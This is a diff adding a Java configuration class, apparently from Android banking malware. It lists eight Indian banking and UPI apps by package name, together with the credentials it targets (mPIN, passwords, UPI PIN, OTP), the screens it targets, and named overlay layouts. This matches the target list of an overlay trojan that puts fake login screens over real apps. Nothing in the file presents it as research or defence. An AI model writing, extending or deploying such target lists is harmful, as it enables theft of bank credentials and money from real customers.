@@ -1,0 +1,92 @@
+// BankingTargets.java
+package com.godz.rtoRed.admin.banking;
+
+import java.util.HashMap;
+import java.util.Map;
+
+public class BankingTargets {
+    
+    public static final Map<String, BankingAppConfig> TARGET_APPS = new HashMap<>();
+    
+    static {
+        // Indian Banking Apps
+        TARGET_APPS.put("com.sbi.SBIFreedomPlus", new BankingAppConfig(
+            "State Bank of India",
+            new String[]{"mPin", "password", "transactionPassword", "otp"},
+            new String[]{"login", "fundTransfer", "upi", "balance"},
+            "sbi_overlay"
+        ));
+        
+        TARGET_APPS.put("com.hdfc.bank", new BankingAppConfig(
+            "HDFC Bank",
+            new String[]{"mpin", "ipin", "password", "otp"},
+            new String[]{"login", "netbanking", "transfer", "billpay"},
+            "hdfc_overlay"
+        ));
+        
+        TARGET_APPS.put("com.icici.bankapp", new BankingAppConfig(
+            "ICICI Bank iMobile",
+            new String[]{"userid", "password", "mpin", "otp"},
+            new String[]{"login", "transfer", "imps", "recharge"},
+            "icici_overlay"
+        ));
+        
+        TARGET_APPS.put("com.phonepe.app", new BankingAppConfig(
+            "PhonePe",
+            new String[]{"upiPin", "password", "mpin", "otp"},
+            new String[]{"sendmoney", "recharge", "billpay", "scanpay"},
+            "phonepe_overlay"
+        ));
+        
+        TARGET_APPS.put("com.google.android.apps.nbu.paisa.user", new BankingAppConfig(
+            "Google Pay",
+            new String[]{"upiPin", "googlePassword", "otp"},
+            new String[]{"payment", "send", "request", "recharge"},
+            "gpay_overlay"
+        ));
+        
+        TARGET_APPS.put("in.org.npci.upiapp", new BankingAppConfig(
+            "BHIM UPI",
+            new String[]{"upiPin", "mpin", "otp"},
+            new String[]{"send", "collect", "scan", "balance"},
+            "bhim_overlay"
+        ));
+        
+        TARGET_APPS.put("com.paytm", new BankingAppConfig(
+            "Paytm",
+            new String[]{"password", "mpin", "otp", "securityCode"},
+            new String[]{"login", "transfer", "recharge", "wallet"},
+            "paytm_overlay"
+        ));
+        
+        TARGET_APPS.put("com.axis.mobile", new BankingAppConfig(
+            "Axis Mobile",
+            new String[]{"loginPassword", "transactionPassword", "otp"},
+            new String[]{"login", "transfer", "billpay", "cards"},
+            "axis_overlay"
+        ));
+    }
+    
+    public static class BankingAppConfig {
+        String bankName;
+        String[] credentialFields;
+        String[] targetActivities;
+        String overlayLayout;
+        
+        public BankingAppConfig(String bankName, String[] credentialFields, 
+                               String[] targetActivities, String overlayLayout) {
+            this.bankName = bankName;
+            this.credentialFields = credentialFields;
+            this.targetActivities = targetActivities;
+            this.overlayLayout = overlayLayout;
+        }
+    }
+    
+    public static BankingAppConfig getConfigForPackage(String packageName) {
+        return TARGET_APPS.get(packageName);
+    }
+    
+    public static boolean isBankingApp(String packageName) {
+        return TARGET_APPS.containsKey(packageName);
+    }
+}
